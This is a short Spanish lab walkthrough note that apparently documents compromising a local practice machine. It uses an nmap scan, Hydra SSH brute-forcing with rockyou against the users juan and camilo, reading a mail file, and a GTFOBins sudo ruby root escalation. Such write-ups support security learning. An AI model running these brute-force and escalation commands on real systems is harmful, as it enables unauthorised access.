1. Realizamos un [[00. Apuntes/01. Herramientas/NMAP|NMAP]] hacia la IP objetivo:
`nmap -p- -sS -sCV --min-rate 5000 -n -vvv -Pn "IP" -oN "NombreFichero"`

2. Observamos los Puertos 22 (SSH) y 80 (HTTP) abiertos:
![[Pasted image 20241118095752.png]]

3. Navegamos a la IP:
- Encontramos lo siguiente en el código fuente:
![[Pasted image 20241118095854.png]]

4.  Probamos haciendo un ataque de fuerza bruta con [[HYDRA]] al SSH del usuario Juan:
`hydra -l juan -P /usr/share/wordlists/rockyou.txt ssh://IP`

5.   Al no encontrar resultados lo hacemos con camilo:
`hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://IP`

![[Pasted image 20241118100222.png]]

6.  Accedemos por SSH:
`ssh camilo@172.17.0.2`

7. Al hablar en el mensaje de un correo no vamos a `/var/mail`
![[Pasted image 20241118100656.png]]
- `cd camilo`
- `ls`
![[Pasted image 20241118100832.png]]

- `cat correo.txt`
![[Pasted image 20241118100901.png]]

8. Como el correo lo ha dejado juan probamos a iniciar sesion con su usuario:
`su juan`
- Conseguimos el acceso como juan y nos generamos una bash 
`script /dev/null -c bash`
- Buscamos que puede realizar el usuario con privilegios de root `sudo -l`
![[Pasted image 20241118101406.png]]

9. Escalada de privilegios:
- Buscamos en [[GTFOBINS]] ruby
- Encontramos el comando para la escalada de privilegios ````
sudo ruby -e 'exec "/bin/sh"'
- Lo ejecutamos
![[Pasted image 20241118101707.png]]




